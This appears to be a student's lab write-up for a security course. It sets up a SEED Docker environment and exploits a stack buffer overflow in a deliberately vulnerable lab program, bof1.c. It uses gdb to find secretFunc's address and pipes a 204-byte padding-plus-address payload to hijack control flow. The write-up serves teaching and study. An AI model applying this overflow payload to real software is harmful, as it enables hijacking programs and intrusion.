# Lab#1 Conduct buffer overflow attack .
## Prepared the eviroment .
  1. Open your Docker Destop
  2. Choice the folder contain file lab and open Terminal
     
      ```bash
      git clone https://github.com/quang-ute/myprojects
      ```
      and after that:
     ```bash
     cd myprojects
     ```
  3. Build the image `img4lab` by Docker
     ```bash
     docker build -t img4lab .
     ```
     and run docker container
     ```bash
      docker run -it --privileged -v $HOME/seclabs:/home/seed/seed@ img4lab
     ```
  4. On `seed@...`
     ```
     cd seclabs
     ```
     create a new direction named `bof`
     ```bash
     mkdir bof
     ```
     and after that:
     ```bash
     cd bof
     ```
     and Open you VSCode -> Connect to WSL -> Open folder `bof`  and catch file bof1, bof2, bof3 from `https://github.com/quang-ute/Security-labs/tree/main/Software/buffer-overflow`
## Attack
![image](https://github.com/user-attachments/assets/3ca0dd01-c5b1-4abd-adcb-757f64f60c0d)
If an attacker supplies more input than the buffer array[200] can handle, they could potentially control the flow of the program and execute unintended code.

1. On `/seclabs/bof$`
   ```bash
   gcc -g bof1.c -o bof.out -fno-stack-protector -mpreferred-stack-boundary=2
   ```
   and load bof1.out in gdb
  
    ```bash
    gdb bof1.out
    ```
  2. Use the disassemble command to display the assembly code
     ```bash
     disas secretFunc
     ```
     ![image](https://github.com/user-attachments/assets/7ee1e5e0-441a-4a39-9a40-bb98f3545acc)
  The secretFunc() memory region is `0x0804846b`
  3. Input 'a'*204 followed by `0x0804846b`
     ```bash
     echo $( python -c "print('a'*204 + '\x6b\x84\x04\x08')") | ./bof1.out
     ```
       ![image](https://github.com/user-attachments/assets/a93df09c-aaec-4d0d-8bb4-f96f3cb402b4)
     To remove the Missing arguments line, add any value at the end of your command

     ```bash
     echo $( python -c "print('a'*204 + '\x6b\x84\x04\x08')") | ./bof1.out 120
     ```
     ![image](https://github.com/user-attachments/assets/3074ef1f-1809-45df-b5aa-61ef31dffcff)

     



    
